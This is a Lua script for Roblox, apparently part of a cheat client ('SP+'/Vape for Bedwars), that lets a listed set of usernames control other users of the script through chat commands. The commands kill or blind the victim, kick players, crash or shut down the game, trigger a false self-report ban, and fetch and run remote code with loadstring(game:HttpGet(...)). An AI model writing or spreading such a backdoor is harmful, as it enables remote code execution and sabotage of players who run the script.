		local textChatService = game:GetService("TextChatService")
		local allowedplayers = {
			{name = "ggSnoopyConfigs", tag = 1 },
			{name = "haterbot", tag = 2};
      {name = "iFoundMomsNonKidToys", tag = 2 },
		}
		
		local chatTags = {
			[1] = {name = "SP+ OWNERðŸ’œ", color = Color3.fromRGB(137, 207, 240)},
			[2] = {name = "SP+ PRIVATE", color = Color3.fromRGB(137, 207, 240)},
			[3] = {name = "SP+ DEV", color = Color3.fromRGB(137, 207, 240)},
			[4] = {name = "SP+ ADMIN", color = Color3.fromRGB(137, 207, 240)},
		}
		 
		local playersService = game:GetService("Players")
		
		local function getPlayerTag(playerName)
			for _, player in ipairs(allowedplayers) do
				if player.name == playerName then
					return player.tag
				end
			end
			return nil
		end
		
		local function isPlayerAllowed(playerName)
			return getPlayerTag(playerName) ~= nil
		end
		
		local commands = {
		
			[";kill default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				end
			end,
			[";funnyvideo default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local filename = "bruh"
					local ScreenGui = Instance.new("ScreenGui")
					ScreenGui.IgnoreGuiInset = true
					ScreenGui.Parent = game:GetService("CoreGui")
					
					local video = Instance.new("VideoFrame")
					video.Size = UDim2.new(1, 0, 1, 0)
					video.Parent = ScreenGui
					
					local Name = filename .. ".mp4"
					if not isfile(Name) then
						writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
					end
					
					video.Video = syn and getsynasset(Name) or getcustomasset(Name)
					
					repeat
						task.wait()
						print("Retrying...")
					until video.Loaded
					
					video:Play()
				end
			end,
			[";reveal default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local textChatService = game:GetService("TextChatService")
					wait(0.0001)
					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("SP+ On Top")
				end
			end,
			[";void default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local character = game.Players.LocalPlayer.Character
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local newPosition = humanoidRootPart.CFrame
					for i = 1, 3 do
						newPosition = newPosition + Vector3.new(0, -40, 0)
						humanoidRootPart.CFrame = newPosition
						wait(0.01)
					end
				end
			end,
			[";blind default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local blur = Instance.new("BlurEffect")
					blur.Size = 10000000000000
					blur.Parent = game.Lighting
				end
			end,
			[";unblind default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
					if blur then
						blur:Destroy()
					end
				end
			end,
			[";troll default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
				end
			end,
			[";kick default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					wait(1)
					for index, player in pairs(game.Players:GetPlayers()) do
						player:Kick("Snoopy Owns You")
					end
				end
			end,
			[";ban default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local rs = game:GetService("ReplicatedStorage")
					local remote = rs:FindFirstChild("SelfReport", true)
					remote:FireServer("injection_detected")
				end
			end,
			[";rickroll default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
				end
			end,
			[";freeze default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
				end
			end,
			[";thaw default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
				end
			end,
			[";lobby default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
				end
			end,
			[";quitgame default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game:Shutdown()
				end
			end,
			[";lagback default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					for i = 1, 10 do
						wait()
						local player = game.Players.LocalPlayer
						local character = player.Character or player.CharacterAdded:Wait()
						local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
						local forwardVector = humanoidRootPart.CFrame.LookVector
						local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
						humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
					end
				end
			end,
			[";breakgame default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					pcall(function()
						local replicatedStorage = game:GetService("ReplicatedStorage")
						for _, child in ipairs(replicatedStorage:GetDescendants()) do
							child:Destroy()
						end
					end)
				end
			end,
			[";breakmap default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local function unanchorParts(object)
						if object:IsA("BasePart") then
							object.Anchored = false
						end
						for _, child in ipairs(object:GetChildren()) do
							unanchorParts(child)
						end
					end
					unanchorParts(workspace)
				end
			end,
			[";crash default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					while true do end
				end
			end,
			[";infping default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local thingy = settings().Network
					thingy.IncomingReplicationLag = math.huge
				end
			end
		}
		
		
		textChatService.OnIncomingMessage = function(message)
			local props = Instance.new("TextChatMessageProperties")
				if message.TextSource then
					local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
					if plr then
						local args = message.Text:split(" ")
						local client = bedwarsStore.whitelist.chatStrings1[#args > 0 and args[#args] or message.Text]
						local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr)
						props.PrefixText = message.PrefixText
						if bedwarsStore.whitelist.clientUsers[plr.Name] then
							props.PrefixText = "<font color='#"..Color3.new(1, 1, 0):ToHex().."'>["..bedwarsStore.whitelist.clientUsers[plr.Name].."]</font> "..props.PrefixText
						end
						if plrtag then
							props.PrefixText = message.PrefixText
							for i, v in pairs(plrtag) do 
								props.PrefixText = "<font color='#"..v.color:ToHex().."'>["..v.text.."]</font> "..props.PrefixText
							end
						end
						if plr:GetAttribute("ClanTag") then 
							props.PrefixText = "<font color='#FFFFFF'>["..plr:GetAttribute("ClanTag").."]</font> "..props.PrefixText
						end
						if plr == lplr then 
							if WhitelistFunctions.LocalPriority > 0 then
								if message.Text:len() >= 5 and message.Text:sub(1, 5):lower() == ";cmds" then
									local tab = {}
									for i,v in pairs(vapePrivateCommands) do
										table.insert(tab, i)
									end
									table.sort(tab)
									local str = ""
									for i,v in pairs(tab) do
										str = str..";"..v.."\n"
									end
									message.TextChannel:DisplaySystemMessage(str)
								end
							end
						else
							if WhitelistFunctions.LocalPriority > 0 and message.TextChannel.Name:find("RBXWhisper") and client ~= nil and alreadysaidlist[plr.Name] == nil then
								message.Text = ""
								alreadysaidlist[plr.Name] = true
								warningNotification("Vape", plr.Name.." is using "..client.."!", 60)
								WhitelistFunctions.CustomTags[plr.Name] = string.format("[%s] ", client:upper()..' USER')
								bedwarsStore.whitelist.clientUsers[plr.Name] = client:upper()..' USER'
								local ind, newent = entityLibrary.getEntityFromPlayer(plr)
								if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
							end
							if otherPriority > 0 and otherPriority > WhitelistFunctions.LocalPriority and #args > 1 then
								table.remove(args, 1)
								local chosenplayers = findplayers(args[1], plr)
								table.remove(args, 1)
								for i,v in pairs(vapePrivateCommands) do
									if message.Text:len() >= (i:len() + 1) and message.Text:sub(1, i:len() + 1):lower() == ";"..i:lower() then
										message.Text = ""
										if table.find(chosenplayers, lplr) then
											v(args, plr)
										end
										break
									end
								end
							end
						end
					end
				else
					if WhitelistFunctions:IsSpecialIngame() and message.Text:find("You are now privately chatting") then 
						message.Text = ""
					end
				end
				if message.TextSource then
					local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
					local tag = getPlayerTag(player.Name)
					if tag then
						local tagData = chatTags[tag]
						local tagText = "[" .. tagData.name .. "]"
						local color = tagData.color
						props.PrefixText = string.format("<font color='rgb(%d, %d, %d)'>%s</font> %s", color.R * 255, color.G * 255, color.B * 255, tagText, message.PrefixText)
					end
				end
				if message.TextSource then
					local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
					if isPlayerAllowed(player.Name) then
						local command = commands[message.Text]
						if command then
							command()
						end
					end
				end
				return props
		end
